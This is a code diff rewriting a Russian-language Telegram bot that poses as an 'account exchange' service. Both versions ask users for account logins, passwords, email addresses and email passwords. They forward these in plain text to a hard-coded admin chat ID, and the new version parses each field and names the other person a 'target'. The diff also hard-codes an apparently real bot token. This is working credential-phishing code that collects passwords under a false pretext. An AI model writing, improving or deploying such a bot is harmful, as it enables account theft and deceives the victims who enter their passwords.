@@ -1,56 +1,64 @@
-import telegram
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-from telegram import Update
+import telebot
+from telebot import types
 
-# Your bot token and your Telegram ID
 TOKEN = "7837835834:AAHm3-hrbWlZ5tpKB2W6T16-keyolIQ-q84"
-OWNER_ID = 6760627781
+ADMIN_ID = 6760627781  # Замените на ваш ID
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    welcome_message = (
-        "Привет, это бот для обмена аккаунтами! Чтобы обменяться с человеком, заполни таблицу:\n\n"
-        "Логин:\n"
-        "Пароль:\n"
-        "Почта (если есть):\n"
-        "Пароль от почты (если есть):\n"
-        "Тег человека:\n"
-    )
-    await update.message.reply_text(welcome_message)
-    # Store user state to expect their input
-    context.user_data['awaiting_input'] = True
+bot = telebot.TeleBot(TOKEN)
+user_data = {}
 
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if context.user_data.get('awaiting_input', False):
-        user = update.effective_user
-        message = update.message.text
+@bot.message_handler(commands=['start'])
+def start(message):
+    try:
+        markup = types.ReplyKeyboardRemove()
+        msg = bot.send_message(
+            message.chat.id,
+            "👋 Привет! Это бот для обмена аккаунтами.\n\n"
+            "📝 Заполни данные:\n\n"
+            "Логин:\n"
+            "Пароль:\n"
+            "Почта (если есть):\n"
+            "Пароль от почты (если есть):\n"
+            "Тег человека:",
+            reply_markup=markup
+        )
+        bot.register_next_step_handler(msg, process_data)
+    except Exception as e:
+        print(f"Ошибка: {e}")
+
+def process_data(message):
+    try:
+        data = message.text.split('\n')
+        user_id = message.from_user.id
         
-        # Forward the message to the owner
-        try:
-            await context.bot.send_message(
-                chat_id=OWNER_ID,
-                text=f"Новое сообщение от @{user.username} (ID: {user.id}):\n\n{message}"
-            )
-            # Confirm to the user that their message was sent
-            await update.message.reply_text("Ваше сообщение отправлено! Ожидайте ответа.")
-        except telegram.error.TelegramError as e:
-            await update.message.reply_text("Произошла ошибка при отправке сообщения. Попробуйте позже.")
-            print(f"Error sending message: {e}")
+        user_data[user_id] = {
+            'login': data[0].replace("Логин:", "").strip(),
+            'password': data[1].replace("Пароль:", "").strip(),
+            'email': data[2].replace("Почта (если есть):", "").strip(),
+            'email_pass': data[3].replace("Пароль от почты (если есть):", "").strip(),
+            'target': data[4].replace("Тег человека:", "").strip()
+        }
         
-        # Reset the state
-        context.user_data['awaiting_input'] = False
+        # Отправка админу
+        report = f"""
+        🚨 Новый запрос на обмен!
+        👤 От: @{message.from_user.username}
+        🔑 Логин: {user_data[user_id]['login']}
+        🔒 Пароль: {user_data[user_id]['password']}
+        📧 Почта: {user_data[user_id]['email'] or 'Нет'}
+        🗝 Пароль от почты: {user_data[user_id]['email_pass'] or 'Нет'}
+        🎯 Тег цели: {user_data[user_id]['target']}
+        """
+        bot.send_message(ADMIN_ID, report)
+        
+        bot.send_message(message.chat.id, "✅ Данные отправлены! Скоро с вами свяжутся.")
+        
+    except IndexError:
+        bot.send_message(message.chat.id, "❌ Ошибка формата! Используйте шаблон из сообщения.")
+    except Exception as e:
+        bot.send_message(message.chat.id, "⚠️ Произошла ошибка, попробуйте позже.")
+        bot.send_message(ADMIN_ID, f"Ошибка у @{message.from_user.username}: {str(e)}")
 
-def main():
-    # Create the Application
-    application = Application.builder().token(TOKEN).build()
-
-    # Add handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-
-    # Start the bot
-    print("Bot is running...")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    print("Бот запущен...")
+    bot.polling(none_stop=True)
